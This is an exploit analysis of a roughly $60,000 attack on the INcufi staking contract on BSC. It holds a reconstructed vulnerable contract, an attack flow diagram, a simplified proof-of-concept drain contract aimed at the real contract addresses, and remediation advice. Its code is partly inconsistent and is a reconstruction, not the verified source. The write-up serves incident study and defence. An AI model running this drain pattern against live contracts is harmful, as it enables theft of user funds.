# INcufi — STAKE() 0-Day Duration + withdral() + swapCommision() CREATE2 Exploit Analysis

| Field | Details |
|------|------|
| **Date** | 2024-06 |
| **Protocol** | INcufi |
| **Chain** | BSC |
| **Loss** | ~$60,000 |
| **Ncufi Contract** | [0x80df77b2Ae5828FF499A735ee823D6CD7Cf95f5a](https://bscscan.com/address/0x80df77b2Ae5828FF499A735ee823D6CD7Cf95f5a) |
| **AKITADEF Token** | [0x3213573C46eb905bA17F0Bb650E10C2352552e8a](https://bscscan.com/address/0x3213573C46eb905bA17F0Bb650E10C2352552e8a) |
| **Root Cause** | The `STAKE()` function allows a lock duration of 0, the `withdral()` function contains a typo that bypasses internal validation, and `swapCommision()` accumulates fees to referrer addresses created via CREATE2 which are then drained |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-06/INcufi_exp.sol) |

---

## 1. Vulnerability Overview

The INcufi staking contract suffers from three compounding flaws. First, the `STAKE()` function allows a lock duration of 0, enabling immediate withdrawal. Second, the `withdral()` function (typo: `withdral` instead of `withdraw`) contains a bug in the lock duration validation logic that pays out rewards even for 0-day stakes. Third, the `swapCommision()` function accepts a referrer address as a parameter; the attacker deployed 100 referrer contracts at predictable addresses via CREATE2, accumulated large amounts of fees, and swapped them for AKITADEF tokens.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: STAKE allows 0-day duration + withdral validation bug
contract Ncufi {
    struct StakeInfo {
        uint256 amount;
        uint256 lockDuration; // 0 allowed
        uint256 startTime;
        uint256 commission;
    }
    mapping(address => StakeInfo) public stakes;

    // Allows lockDuration of 0 — immediate withdrawal possible
    function STAKE(uint256 amount, uint256 lockDuration, address referrer) external {
        // lockDuration >= 0 allowed (0-day staking possible)
        stakes[msg.sender] = StakeInfo(amount, lockDuration, block.timestamp, 0);
        token.transferFrom(msg.sender, address(this), amount);
        // Accumulate commission for referrer
        stakes[referrer].commission += calculateCommission(amount);
    }

    // Typo: withdral (not withdraw) — lock validation bug
    function withdral(uint256 amount) external {
        StakeInfo storage info = stakes[msg.sender];
        // Bug: condition always passes when lockDuration == 0
        require(block.timestamp >= info.startTime + info.lockDuration, "locked");
        info.amount -= amount;
        token.transfer(msg.sender, amount + info.commission);
        info.commission = 0;
    }

    // Fee draining via CREATE2 referrer
    function swapCommision(address referrer) external {
        // No referrer address validation
        uint256 comm = stakes[referrer].commission;
        stakes[referrer].commission = 0;
        AKITADEF.transfer(msg.sender, comm);
    }
}

// ✅ Safe code
function STAKE(uint256 amount, uint256 lockDuration, address referrer) external {
    require(lockDuration >= MIN_LOCK_DURATION, "lock too short");
    require(referrer != address(0) && referrer != msg.sender, "invalid referrer");
    // ...
}

function withdraw(uint256 amount) external {
    StakeInfo storage info = stakes[msg.sender];
    require(block.timestamp >= info.startTime + info.lockDuration, "locked");
    require(info.amount >= amount, "insufficient");
    info.amount -= amount;
    token.transfer(msg.sender, amount);
}
```

### On-chain Original Code

Source: Sourcify verified

```solidity
// File: INcufi_decompiled.sol
contract INcufi {
    function STAKE(uint256 p0, uint256 p1, uint256 p2) external {}  // ❌ Vulnerability
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] Deploy 100 referrer contracts via CREATE2
  │         └─ Predictable addresses → registered as referrers
  │
  ├─→ [2] STAKE(amount, 0, referrer[i]) × 100 times
  │         └─ lockDuration = 0 → immediate withdrawal possible
  │         └─ Referrer commissions accumulate
  │
  ├─→ [3] withdral(amount) × 100 times
  │         └─ lockDuration=0 → block.timestamp >= startTime passes immediately
  │         └─ Stake principal + commission recovered instantly
  │
  ├─→ [4] swapCommision(referrer[i]) × 100 times
  │         └─ Referrer commissions → swapped for AKITADEF tokens
  │         └─ No commission validation → mass drain
  │
  └─→ [5] ~$60K AKITADEF drained
```

## 4. PoC Code (Core Logic + Comments)

```solidity
interface INcufi {
    function STAKE(uint256 amount, uint256 lockDuration, address referrer) external;
    function withdral(uint256 amount) external;
    function swapCommision(address referrer) external;
}

contract ReferrerContract {
    // Referrer contract deployed via CREATE2
}

contract AttackContract {
    INcufi constant ncufi = INcufi(0x80df77b2Ae5828FF499A735ee823D6CD7Cf95f5a);
    IERC20 constant AKITADEF = IERC20(0x3213573C46eb905bA17F0Bb650E10C2352552e8a);

    address[] referrers;

    function testExploit() external {
        // [1] Deploy 100 referrer contracts via CREATE2
        for (uint i = 0; i < 100; i++) {
            bytes32 salt = bytes32(i);
            address referrer = address(new ReferrerContract{salt: salt}());
            referrers.push(referrer);
        }

        // [2] Perform 0-day staking 100 times using each referrer
        for (uint i = 0; i < 100; i++) {
            token.approve(address(ncufi), stakeAmount);
            ncufi.STAKE(stakeAmount, 0, referrers[i]); // lockDuration = 0
        }

        // [3] Withdraw immediately (0-day lock passes instantly)
        for (uint i = 0; i < 100; i++) {
            ncufi.withdral(stakeAmount);
        }

        // [4] Claim referrer commissions as AKITADEF via swapCommision
        for (uint i = 0; i < 100; i++) {
            ncufi.swapCommision(referrers[i]);
        }
        // ~$60K AKITADEF drained
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Staking lock duration not validated + referrer commission draining |
| **CWE** | CWE-284: Improper Access Control |
| **Attack Vector** | External (STAKE 0-day + withdral + swapCommision + CREATE2) |
| **DApp Category** | Staking / referral reward protocol |
| **Impact** | Immediate withdrawal + mass referrer commission drain (~$60K) |

## 6. Remediation Recommendations

1. **Enforce minimum lock duration**: Add `require(lockDuration >= MIN_LOCK_DURATION)`
2. **Fix function name typo**: Rename `withdral` → `withdraw` and re-audit
3. **Validate referrer address**: Add `require(referrer != address(0) && referrer != msg.sender)`
4. **Track commission origin**: Verify that the `swapCommision` caller is the referrer themselves or an approved address
5. **Whitelist CREATE2 addresses**: Restrict which referrer addresses can be registered

## 7. Lessons Learned

- Allowing a lock duration of 0 in a staking contract defeats the purpose of staking entirely and creates an immediate reward-draining vector.
- A function name typo is not merely a coding mistake — it can result in gaps in audit coverage.
- Pre-generating referrer addresses via CREATE2 is a classic abuse pattern against any referral system that lacks a whitelist.